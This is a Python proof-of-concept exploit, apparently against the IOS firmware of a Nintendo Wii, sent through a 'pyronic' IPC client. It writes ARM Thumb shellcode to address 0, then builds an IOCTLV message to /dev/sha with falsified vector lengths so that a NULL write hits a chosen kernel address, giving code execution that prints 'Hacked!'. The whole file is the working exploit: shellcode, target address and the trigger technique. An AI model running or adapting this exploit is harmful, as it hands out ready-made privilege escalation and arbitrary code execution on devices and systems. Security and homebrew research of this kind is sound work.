#!/usr/bin/python3

from sys import argv

from struct import pack, unpack
from hexdump import hexdump
from pyronic.client import *

ipc = IPCClient()

esfd = ipc.IOSOpen("/dev/sha")
print("fd={}".format(esfd))

code = b"".join([
    b"\x21\xff", # movs r1, #ff 
    b"\x20\x04", # movs r0, #4
    b"\xdf\xab", # svc 0xAB
    b"\x46\xc0", # nop (mov r8, r8)
    b"\xe7\xfd", # b #0x6 (loop)
])

# limited to 14 chars + \n + \0
hacked_msg = b"Hacked!\n\0"

# Write code to 0x0
ipc.alloc_buf(code, 0)
# Write our message to 0x100
ipc.alloc_buf(hacked_msg, 256)

# The ioctlv helper is too nice and populates vector lengths for us
# but we need to lie about the vector lengths to trigger the exploit
# so construct an IPC message manually.

vecbuf = bytearray()

# In vector can just be a NULL
vecbuf += pack(">Q", 0)
# Out vector 1 data contains the pointer where we write NULL to
if len(argv) > 1 and argv[1]: # allow user specified addr
    vecbuf += pack(">L", int(argv[1], 16))
else: # fall back to the one that works for most IOS
    vecbuf += pack(">L", 0xFFFE0028)
vecbuf += pack(">L", 0) # lie about vector len
# second out vector is not important
vecbuf += pack(">L", 0)
vecbuf += pack(">L", 32)

# write vectors to guest memory
handle = ipc.alloc_buf(vecbuf)

# build IPC message
msg = IPCMsg(ipc.IPC_IOCTLV, fd=esfd, args=[
    AES.Copy, # ioctl number
    1, # number of in vectors
    2, # number of out vectors
    handle.paddr # pointer to vectors
])
ret = ipc.guest_ipc(msg)
print(unpack(">i", ret.read()[4:8])[0])
